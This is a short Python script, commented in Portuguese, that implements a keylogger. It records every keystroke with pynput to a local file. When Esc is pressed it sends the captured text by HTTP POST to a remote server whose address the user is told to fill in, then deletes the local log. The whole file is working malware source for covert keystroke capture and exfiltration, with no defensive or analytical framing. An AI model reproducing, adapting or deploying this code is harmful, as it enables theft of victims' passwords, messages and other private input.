from pynput.keyboard import Key, Listener
import requests
import shutil
import os

arquivo_logs = 'Key_logs.txt'
arquivo_backup = 'Backup_logs.txt'
server_url = 'http://'  # Coloque o Ip do seu servidor aqui


def upload_dados():  # Função de envio dos arquivos
    # Faz o backup dos arquivos
    if os.path.exists(arquivo_logs):
        shutil.copy(arquivo_logs, arquivo_backup)

    # Salva os dados numa variável
    with open(arquivo_logs, 'r', encoding='utf-8') as log:
        dados = log.read()

    # Faz o envio pro servidor e retorna se deu certo ou não
    try:
        response = requests.post(server_url, data={'keylogs': dados})

        if response.status_code == 200:
            os.remove(arquivo_logs)
            return 'Envio executado com sucesso.'
        else:
            return f'O envio falhou. Erro {response.status_code}'
    except Exception as e:
        return f'Falha identificada: {e}'


def keylogger(key):  # Função que registra as teclas (o keylogger em si)
    try:
        with open(arquivo_logs, 'a', encoding='utf-8') as log:
            log.write(f'{key.char}')  # Tecla alfanumérica
    except AttributeError:
        with open(arquivo_logs, 'a', encoding='utf-8') as log:
            if key == Key.space:
                log.write(' [Key.space] ')
            elif key == Key.enter:
                log.write('\n[Key.enter]\n')
            else:
                log.write(f'[{key}]')  # Tecla especial genérica


def escape(key):  # Ao pressionar esc, fecha o programa e envia os dados
    if key == Key.esc:
        return False


# Inicia o monitoramento das teclas
with Listener(on_press=keylogger, on_release=escape) as listener:
    listener.join()  # Mantém o programa rodando até ativar o escape

upload_dados()
